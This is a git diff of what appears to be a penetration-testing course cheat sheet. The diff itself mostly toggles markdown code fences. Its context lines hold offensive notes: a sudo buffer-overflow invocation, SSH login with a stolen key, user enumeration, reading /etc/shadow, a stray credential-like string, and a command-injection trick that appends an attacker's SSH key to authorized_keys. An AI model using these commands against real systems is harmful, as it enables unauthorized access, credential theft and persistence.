@@ -419,7 +419,7 @@ comrade@web:~$ cd /.hidden/
 comrade@web:/.hidden$ sudo ./inventory.exe <<<$(python /home/comrade/linbuffC.py)
 
 
-
+```
 ```
 SSH KEYS:
 
@@ -437,8 +437,8 @@ chmod 600 /home/student/stolenkey
 ssh -i /home/student/stolenkey jane@1.2.3.4
 
 ssh as the user who is the original key owner
-
-
+```
+```
 USER ENUMERATION:
 
 	Windows net user 
@@ -453,8 +453,8 @@ USER ENUMERATION:
 	           systemctl --type=service 
                    ip a
                    
-
-
+```
+```
 DATA EXFILTRATIONS:
 
 Session Transcript
@@ -499,8 +499,8 @@ grep -R <service-name> /var/log
 
 f
 e0R3uOOlCOsLjj991uHK
-
-
+```
+```
 ----------------------------------Upload your ssh key to a box-------------------------------- 
 
 1.Find out what account is running the web sever/commands.  ;whoami do not forget the ; if your trying command injection.
@@ -521,7 +521,8 @@ echo "ssh-rsa... " >> /users/home/directory/.ssh/authorized_keys
 run ; echo "ssh-rsa... " >> /users/home/directory/.ssh/authorized_keys
 
 ----------------------------------------------------------------------------------------------
-
+```
+```
 ENNUMERATION COMMANDS ON LINUX:
 
 find /  -name "*inventory*"
@@ -529,7 +530,7 @@ cat /etc/hosts to finde the intranet
 cat /etc/passwd
 cat /etc/shadow
 
-```
+
 
 
 ```
